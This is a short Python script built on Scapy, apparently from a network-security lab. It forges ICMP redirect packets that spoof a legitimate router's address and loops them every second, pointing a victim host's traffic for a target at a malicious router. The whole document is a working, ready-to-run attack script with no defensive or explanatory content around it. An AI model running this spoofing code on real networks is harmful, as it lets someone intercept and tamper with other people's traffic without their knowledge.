#!/usr/bin/env/python3
from scapy.all import *
import time

# Config
victim_ip = "10.9.0.5"
legit_router_ip = "10.9.0.11"
malicious_router_ip = "10.9.0.111"
target_ip = "192.168.60.5"

# Packet
ip = IP(src=legit_router_ip, dst=victim_ip)
icmp = ICMP(type=5, code=1, gw=malicious_router_ip)
original = IP(src=victim_ip, dst=target_ip) 

packet = ip / icmp / original / ICMP()

try:
   while True:
     send(packet)
     time.sleep(1)  # wait 1 second to avoid flooding too hard
except KeyboardInterrupt:
   print("\n[+] Stopped.")
